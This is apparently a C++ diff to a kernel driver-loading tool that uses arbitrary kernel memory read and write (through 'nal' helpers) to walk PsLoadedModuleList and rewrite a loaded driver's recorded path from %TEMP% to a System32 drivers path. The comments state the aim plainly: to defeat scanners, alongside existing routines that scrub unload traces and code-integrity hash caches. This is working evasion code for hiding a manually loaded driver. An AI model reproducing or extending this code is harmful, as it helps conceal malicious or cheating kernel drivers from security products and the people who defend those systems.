@@ -30,6 +30,15 @@ namespace
     constexpr uint64_t kHashEntryName = 0x10;
     constexpr uint64_t kHashEntrySize = 0x38;
 
+    /* KLDR_DATA_TABLE_ENTRY on x64: InLoadOrderLinks (0x00), DllBase (0x30),
+     * FullDllName (0x48), BaseDllName (0x58). Only the load-order list is walked -
+     * the other two link fields point at the same entries but are not maintained for
+     * a driver object. */
+    constexpr uint64_t kLdrNext = 0x00;
+    constexpr uint64_t kLdrDllBase = 0x30;
+    constexpr uint64_t kLdrFullDllName = 0x48;
+    constexpr uint64_t kLdrBaseName = 0x58;
+
     /*
      * g_KernelHashBucketList and g_HashCacheLock are not exported. This is the
      * ci.dll sequence that references the list; the lock is a `lea rcx,[rip+x]`
@@ -680,5 +689,89 @@ namespace trace
                           unloaded, cached, hashed, BaseName(imageName).c_str());
         else
             km_log::Warn("trace scrub found nothing for %ls", BaseName(imageName).c_str());
+    }
+
+    /*
+     * Rewrites the host's own module-list entry so the path ntoskrnl recorded for a
+     * loaded driver stops pointing at %TEMP%.
+     *
+     * This is what a scanner actually reads. For a loaded driver the path comes out
+     * of its KLDR_DATA_TABLE_ENTRY, not off the disk, so deleting the file leaves the
+     * recorded name untouched and the driver stays named by where it was loaded from.
+     *
+     * The base name is kept deliberately: the unload scrub matches on it, and the
+     * MmUnloadedDrivers record written at unload takes the same name. Only the
+     * directory is disguised, into where an in-box driver of that name would sit.
+     */
+    bool DisguiseLoadedModule(const std::wstring& imageName)
+    {
+        const std::wstring wanted = BaseName(imageName);
+
+        if (wanted.empty())
+            return false;
+
+        const uint64_t kernelBase = nal::ResolveKernelBase();
+
+        if (!kernelBase)
+        {
+            km_log::Warn("kernel base unresolved - host keeps its real path");
+            return false;
+        }
+
+        const uint64_t list = nal::GetKernelModuleExport(kernelBase, "PsLoadedModuleList");
+
+        if (!list || !KernelRange(list, 0x10))
+        {
+            km_log::Warn("PsLoadedModuleList unresolved - host keeps its real path");
+            return false;
+        }
+
+        uint64_t head = 0;
+
+        if (!nal::ReadMemory(list, &head, sizeof(head)))
+            return false;
+
+        for (uint32_t guard = 0; head && head != list && guard < kMaxNodes; ++guard)
+        {
+            const uint64_t entry = head;
+            uint64_t dllBase = 0;
+            std::wstring name;
+
+            if (!nal::ReadMemory(entry + kLdrNext, &head, sizeof(head)))
+                return false;
+
+            if (!nal::ReadMemory(entry + kLdrDllBase, &dllBase, sizeof(dllBase)) ||
+                !KernelRange(dllBase, 0x1000))
+                continue;
+
+            if (!ReadUnicodeName(entry + kLdrBaseName, &name) || !SameName(name, wanted))
+                continue;
+
+            const std::wstring disguised =
+                std::wstring(L"\\SystemRoot\\System32\\drivers\\") + wanted;
+            const uint32_t bytes = (uint32_t)(disguised.size() * sizeof(wchar_t));
+
+            const uint64_t buffer = nal::AllocatePool(bytes + sizeof(wchar_t));
+
+            if (!buffer)
+                return false;
+
+            if (!nal::WriteMemory(buffer, (void*)disguised.c_str(), bytes + sizeof(wchar_t)))
+                return false;
+
+            uint8_t descriptor[0x10] = { 0 };
+            *(uint16_t*)(descriptor + 0x00) = (uint16_t)bytes;
+            *(uint16_t*)(descriptor + 0x02) = (uint16_t)(bytes + sizeof(wchar_t));
+            *(uint64_t*)(descriptor + 0x08) = buffer;
+
+            if (!nal::WriteMemory(entry + kLdrFullDllName, descriptor, sizeof(descriptor)))
+                return false;
+
+            km_log::Good("host now reported as %ls", disguised.c_str());
+            return true;
+        }
+
+        km_log::Warn("host entry not found in PsLoadedModuleList");
+        return false;
     }
 }
